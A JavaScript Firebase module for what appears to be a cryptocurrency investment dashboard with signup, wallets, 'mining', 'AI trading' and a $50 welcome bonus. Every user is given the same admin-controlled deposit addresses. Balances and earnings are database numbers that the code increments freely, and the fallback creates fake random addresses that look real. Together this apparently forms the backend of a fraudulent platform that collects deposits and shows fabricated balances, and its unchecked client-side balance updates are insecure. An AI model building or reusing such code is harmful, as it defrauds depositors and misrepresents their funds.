import { 
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut
} from 'firebase/auth';
import { 
  doc, 
  setDoc, 
  getDoc, 
  updateDoc, 
  increment,
  onSnapshot,
  arrayUnion 
} from 'firebase/firestore';
import { auth, db } from '../../firebase';

// ========== DEFAULT WALLET ADDRESS CONFIGURATION ========== //
// You can update these defaults here in code OR override them from the database
export const DEFAULT_WALLET_ADDRESSES = {
  bitcoin: 'bc1qd2wec90rdvv7jgssl9uz859vrflqaprnvppetg',
  ethereum: '0x55db224bC13918664b57aC1B4d46fDA48E03818f',
  solana: 'Fgo1begjZvZSVVSwcPPAG47b8YqLCSZKTf8jcSprqjub',
  usdc: '0x27ce5c98F25EA3E7c8567bd1DD61F6B9036F10C1',
  dogecoin: 'DCzMsvqxcuBhx53vLzoAc8jbCLscyizS9j',
  cardano: 'addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlhx8v4e6y3f3z2j1k9h8g2r7t5w0x3y6z',
  ripple: 'rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH',
  chainlink: '0x3B7a4F6A5a8E3F2C1b9E5B4A7D8C6E9F0A2B3C4D',
  'avalanche-2': '0x5A4e6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3',
  bnb: '0x27ce5c98F25EA3E7c8567bd1DD61F6B9036F10C1',
  tron: 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7',
  litecoin: 'Lc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
  polygon: '0x8A9C3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B'
};

// ========== DATABASE-BASED DEFAULTS ========== //
// This function checks if there are custom defaults in the database
export const getDefaultWalletAddresses = async () => {
  try {
    const defaultsDoc = await getDoc(doc(db, 'system', 'walletDefaults'));
    if (defaultsDoc.exists()) {
      const dbDefaults = defaultsDoc.data();
      // Merge database defaults with code defaults (db takes priority)
      return { ...DEFAULT_WALLET_ADDRESSES, ...dbDefaults };
    }
    return DEFAULT_WALLET_ADDRESSES;
  } catch (error) {
    console.error('Error getting default wallet addresses:', error);
    return DEFAULT_WALLET_ADDRESSES;
  }
};

// ========== ADMIN FUNCTION: Update Default Wallet Addresses ========== //
export const updateDefaultWalletAddresses = async (updates) => {
  try {
    const defaultsRef = doc(db, 'system', 'walletDefaults');
    await setDoc(defaultsRef, updates, { merge: true });
    return { success: true };
  } catch (error) {
    console.error('Error updating default wallet addresses:', error);
    return { success: false, error: error.message };
  }
};

// ========== ADMIN FUNCTION: Reset to Code Defaults ========== //
export const resetToCodeDefaults = async () => {
  try {
    const defaultsRef = doc(db, 'system', 'walletDefaults');
    await setDoc(defaultsRef, DEFAULT_WALLET_ADDRESSES);
    return { success: true };
  } catch (error) {
    console.error('Error resetting to code defaults:', error);
    return { success: false, error: error.message };
  }
};

// ========== ADMIN FUNCTION: Get Current Defaults ========== //
export const getCurrentDefaults = async () => {
  try {
    const defaultsDoc = await getDoc(doc(db, 'system', 'walletDefaults'));
    if (defaultsDoc.exists()) {
      return { 
        success: true, 
        defaults: defaultsDoc.data(),
        source: 'database'
      };
    }
    return { 
      success: true, 
      defaults: DEFAULT_WALLET_ADDRESSES,
      source: 'code'
    };
  } catch (error) {
    console.error('Error getting current defaults:', error);
    return { success: false, error: error.message };
  }
};

// ========== ADMIN USER CHECK ========== //
export const isAdminUser = async (userId) => {
    const adminUserIds = [
        "XxLSLbnvlNWUMRRUor9hHjAcjXn1",
        "jDDCKoecgkRLnVzbZ32vSEt7Cqk1",
    ];
    return adminUserIds.includes(userId);
};

// Sign Up Function - OPTIMIZED FOR NEW DASHBOARD
export const signUp = async (email, password, userData) => {
  try {
    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
    const user = userCredential.user;

    // Get the current default wallet addresses (either from code or database)
    const defaultAddresses = await getDefaultWalletAddresses();

    // Create user document optimized for new dashboard
    await setDoc(doc(db, 'users', user.uid), {
      // User Profile
      email: user.email,
      firstName: userData.firstName,
      lastName: userData.lastName,
      phone: userData.phone,
      country: userData.country,
      
      // Dashboard Statistics - All starting at 0
      balance: 0,
      portfolioChange: 0,
      topGainer: 'Bitcoin',
      mostTraded: 'Ethereum',
      
      // Wallets with default addresses
      wallets: {
        bitcoin: { 
          balance: 0, 
          address: defaultAddresses.bitcoin || '' 
        },
        ethereum: { 
          balance: 0, 
          address: defaultAddresses.ethereum || '' 
        },
        solana: {
          balance: 0,
          address: defaultAddresses.solana || ''
        },
        usdc: {
          balance: 0,
          address: defaultAddresses.usdc || ''
        },
        dogecoin: {
          balance: 0,
          address: defaultAddresses.dogecoin || ''
        },
        cardano: {
          balance: 0,
          address: defaultAddresses.cardano || ''
        },
        ripple: {
          balance: 0,
          address: defaultAddresses.ripple || ''
        },
        chainlink: {
          balance: 0,
          address: defaultAddresses.chainlink || ''
        },
        'avalanche-2': {
          balance: 0,
          address: defaultAddresses['avalanche-2'] || ''
        }
      },
      
      // Mining data
      mining: {
        active: false,
        power: 0,
        earnings: 0,
        lastMined: null
      },
      
      // AI Trading
      aiTrading: {
        connected: userData.aiTrading?.connected || false,
        active: false,
        portfolioValue: 0
      },
      
      // Empty transactions array
      transactions: [],
      
      // Bonus tracking
      hasClaimedWelcomeBonus: false,
      
      // Timestamps
      createdAt: new Date(),
      lastLogin: new Date(),
      updatedAt: new Date()
    });

    return { success: true, user };
  } catch (error) {
    console.error('Signup error:', error);
    return { success: false, error: error.message };
  }
};

// Sign In Function
export const signIn = async (email, password) => {
  try {
    const userCredential = await signInWithEmailAndPassword(auth, email, password);
    
    // Update last login timestamp
    const user = userCredential.user;
    await updateDoc(doc(db, 'users', user.uid), {
      lastLogin: new Date()
    });
    
    return { success: true, user: userCredential.user };
  } catch (error) {
    console.error('Login error:', error);
    return { success: false, error: error.message };
  }
};

// Sign Out Function
export const logout = async () => {
  try {
    await signOut(auth);
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

// Get User Data
export const getUserData = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    return userDoc.exists() ? userDoc.data() : null;
  } catch (error) {
    console.error('Error getting user data:', error);
    return null;
  }
};

// Update User Balance
export const updateUserBalance = async (userId, amount) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      balance: increment(amount),
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error updating balance:', error);
    return { success: false, error: error.message };
  }
};

// Update Bitcoin Wallet Balance
export const updateBitcoinBalance = async (userId, amount) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      'wallets.bitcoin.balance': increment(amount),
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error updating bitcoin balance:', error);
    return { success: false, error: error.message };
  }
};

// Update Specific Wallet Balance
export const updateWalletBalance = async (userId, coinId, amount) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      [`wallets.${coinId}.balance`]: increment(amount),
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error(`Error updating ${coinId} balance:`, error);
    return { success: false, error: error.message };
  }
};

// Get User Dashboard Data
export const getUserDashboardData = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    if (userDoc.exists()) {
      return { success: true, data: userDoc.data() };
    } else {
      return { success: false, error: 'User not found' };
    }
  } catch (error) {
    console.error('Error getting user data:', error);
    return { success: false, error: error.message };
  }
};

// Subscribe to real-time user data
export const subscribeToUserData = (userId, callback) => {
  return onSnapshot(doc(db, 'users', userId), (doc) => {
    if (doc.exists()) {
      callback(doc.data());
    }
  });
};

// Add Transaction
export const addTransaction = async (userId, transaction) => {
  try {
    const userRef = doc(db, 'users', userId);
    const transactionWithId = {
      ...transaction,
      id: Date.now().toString(),
      timestamp: new Date()
    };
    
    await updateDoc(userRef, {
      transactions: arrayUnion(transactionWithId),
      updatedAt: new Date()
    });
    
    return { success: true };
  } catch (error) {
    console.error('Error adding transaction:', error);
    return { success: false, error: error.message };
  }
};

// Update Mining Status
export const updateMiningStatus = async (userId, miningData) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      mining: {
        ...miningData,
        updatedAt: new Date()
      },
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error updating mining status:', error);
    return { success: false, error: error.message };
  }
};

// Update AI Trading Status
export const updateAITradingStatus = async (userId, aiTradingData) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      aiTrading: {
        ...aiTradingData,
        updatedAt: new Date()
      },
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error updating AI trading status:', error);
    return { success: false, error: error.message };
  }
};

// Update User Profile
export const updateUserProfile = async (userId, profileData) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      ...profileData,
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error updating user profile:', error);
    return { success: false, error: error.message };
  }
};

// Claim Bonus Function (for $50 claim) - FIXED WITH REAL BITCOIN PRICE
export const claimBonus = async (userId, bitcoinPrice = 50000) => {
  try {
    const userRef = doc(db, 'users', userId);
    
    // First check if bonus was already claimed
    const userDoc = await getDoc(userRef);
    const userData = userDoc.data();
    
    if (userData.hasClaimedWelcomeBonus) {
      return { success: false, error: 'Bonus already claimed' };
    }
    
    // Add $50 to total balance
    // Calculate equivalent BTC using actual Bitcoin price
    const btcAmount = 50 / bitcoinPrice;
    
    await updateDoc(userRef, {
      balance: increment(50),
      'wallets.bitcoin.balance': increment(btcAmount),
      hasClaimedWelcomeBonus: true,
      updatedAt: new Date()
    });
    
    // Add transaction record with proper amounts
    await addTransaction(userId, {
      type: 'bonus',
      amount: btcAmount, // BTC amount
      amountUsd: 50, // USD amount
      currency: 'BTC',
      coinName: 'Bitcoin',
      description: 'Welcome Bonus Claimed - $50 in BTC',
      status: 'completed'
    });
    
    return { 
      success: true, 
      usdAmount: 50,
      btcAmount: btcAmount,
      bitcoinPrice: bitcoinPrice
    };
  } catch (error) {
    console.error('Error claiming bonus:', error);
    return { success: false, error: error.message };
  }
};

// Check if user has already claimed bonus - UPDATED
export const hasClaimedBonus = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    if (userDoc.exists()) {
      const userData = userDoc.data();
      // Check both the dedicated field and transaction history for redundancy
      return userData.hasClaimedWelcomeBonus === true;
    }
    return false;
  } catch (error) {
    console.error('Error checking bonus claim:', error);
    return false;
  }
};

// Get user bonus status with detailed information
export const getUserBonusStatus = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    if (userDoc.exists()) {
      const userData = userDoc.data();
      return {
        hasClaimed: userData.hasClaimedWelcomeBonus === true,
        canClaim: userData.hasClaimedWelcomeBonus !== true,
        balance: userData.balance || 0,
        bitcoinBalance: userData.wallets?.bitcoin?.balance || 0
      };
    }
    return { hasClaimed: false, canClaim: false, balance: 0, bitcoinBalance: 0 };
  } catch (error) {
    console.error('Error getting user bonus status:', error);
    return { hasClaimed: false, canClaim: false, balance: 0, bitcoinBalance: 0 };
  }
};

// Reset bonus claim (admin function - use carefully)
export const resetBonusClaim = async (userId) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      hasClaimedWelcomeBonus: false,
      updatedAt: new Date()
    });
    return { success: true };
  } catch (error) {
    console.error('Error resetting bonus claim:', error);
    return { success: false, error: error.message };
  }
};

// Get user transactions
export const getUserTransactions = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    if (userDoc.exists()) {
      const userData = userDoc.data();
      return userData.transactions || [];
    }
    return [];
  } catch (error) {
    console.error('Error getting user transactions:', error);
    return [];
  }
};

// Update multiple wallet balances at once
export const updateMultipleWalletBalances = async (userId, walletUpdates) => {
  try {
    const userRef = doc(db, 'users', userId);
    const updates = {
      updatedAt: new Date()
    };
    
    Object.entries(walletUpdates).forEach(([coinId, amount]) => {
      updates[`wallets.${coinId}.balance`] = increment(amount);
    });
    
    await updateDoc(userRef, updates);
    return { success: true };
  } catch (error) {
    console.error('Error updating multiple wallet balances:', error);
    return { success: false, error: error.message };
  }
};

// Get user wallet summary
export const getUserWalletSummary = async (userId) => {
  try {
    const userDoc = await getDoc(doc(db, 'users', userId));
    if (userDoc.exists()) {
      const userData = userDoc.data();
      return {
        totalBalance: userData.balance || 0,
        wallets: userData.wallets || {},
        lastUpdated: userData.updatedAt || userData.createdAt
      };
    }
    return { totalBalance: 0, wallets: {}, lastUpdated: null };
  } catch (error) {
    console.error('Error getting user wallet summary:', error);
    return { totalBalance: 0, wallets: {}, lastUpdated: null };
  }
};

// ========== WALLET ADDRESS FUNCTIONS ========== //

// Get user wallet addresses
export const getUserWalletAddresses = async (userId) => {
  try {
    const docRef = doc(db, 'users', userId);
    const docSnap = await getDoc(docRef);
    
    if (docSnap.exists()) {
      const data = docSnap.data();
      // Extract addresses from wallets object
      const addresses = {};
      if (data.wallets) {
        Object.entries(data.wallets).forEach(([coinId, walletData]) => {
          if (walletData.address) {
            addresses[coinId] = walletData.address;
          }
        });
      }
      return addresses;
    } else {
      // Create user document if it doesn't exist
      await setDoc(docRef, { wallets: {} });
      return {};
    }
  } catch (error) {
    console.error('Error getting wallet addresses:', error);
    return {};
  }
};

// Update user wallet address
export const updateUserWalletAddress = async (userId, coinId, address) => {
  try {
    const userRef = doc(db, 'users', userId);
    await updateDoc(userRef, {
      [`wallets.${coinId}.address`]: address,
      updatedAt: new Date()
    });
  } catch (error) {
    console.error('Error updating wallet address:', error);
    throw error;
  }
};

// Generate new wallet address (now uses defaults)
export const generateNewWalletAddress = async (userId, coinId) => {
  try {
    // Get the current default addresses
    const defaultAddresses = await getDefaultWalletAddresses();
    const defaultAddress = defaultAddresses[coinId];
    
    if (defaultAddress) {
      // Use the default address from configuration
      await updateUserWalletAddress(userId, coinId, defaultAddress);
      return defaultAddress;
    } else {
      // Fallback: generate a mock address if no default exists
      const prefix = getAddressPrefix(coinId);
      const randomPart = Math.random().toString(16).substr(2, 40);
      const newAddress = `${prefix}${randomPart}`;
      
      await updateUserWalletAddress(userId, coinId, newAddress);
      return newAddress;
    }
  } catch (error) {
    console.error('Error generating wallet address:', error);
    throw error;
  }
};

// Helper function to generate appropriate address prefixes
const getAddressPrefix = (coinId) => {
  const prefixes = {
    'bitcoin': 'bc1q',
    'ethereum': '0x',
    'solana': 'So1',
    'dogecoin': 'D',
    'cardano': 'addr1',
    'ripple': 'r',
    'chainlink': '0x',
    'avalanche-2': '0x',
    'usdc': '0x',
    'bnb': 'bnb',
    'tron': 'T',
    'litecoin': 'L',
    'polygon': '0x'
  };
  
  return prefixes[coinId] || '0x';
};

// Get specific wallet address
export const getWalletAddress = async (userId, coinId) => {
  try {
    const addresses = await getUserWalletAddresses(userId);
    return addresses[coinId] || '';
  } catch (error) {
    console.error('Error getting wallet address:', error);
    return '';
  }
};

// Check if wallet address exists
export const hasWalletAddress = async (userId, coinId) => {
  try {
    const addresses = await getUserWalletAddresses(userId);
    return !!addresses[coinId];
  } catch (error) {
    console.error('Error checking wallet address:', error);
    return false;
  }
};

// Initialize wallet addresses for new user (now uses defaults)
export const initializeWalletAddresses = async (userId) => {
  try {
    const userRef = doc(db, 'users', userId);
    const defaultAddresses = await getDefaultWalletAddresses();
    
    const defaultWallets = {
      bitcoin: { balance: 0, address: defaultAddresses.bitcoin || '' },
      ethereum: { balance: 0, address: defaultAddresses.ethereum || '' },
      solana: { balance: 0, address: defaultAddresses.solana || '' },
      usdc: { balance: 0, address: defaultAddresses.usdc || '' },
      dogecoin: { balance: 0, address: defaultAddresses.dogecoin || '' },
      cardano: { balance: 0, address: defaultAddresses.cardano || '' },
      ripple: { balance: 0, address: defaultAddresses.ripple || '' },
      chainlink: { balance: 0, address: defaultAddresses.chainlink || '' },
      'avalanche-2': { balance: 0, address: defaultAddresses['avalanche-2'] || '' }
    };
    
    await updateDoc(userRef, {
      wallets: defaultWallets,
      updatedAt: new Date()
    });
  } catch (error) {
    console.error('Error initializing wallet addresses:', error);
    throw error;
  }
};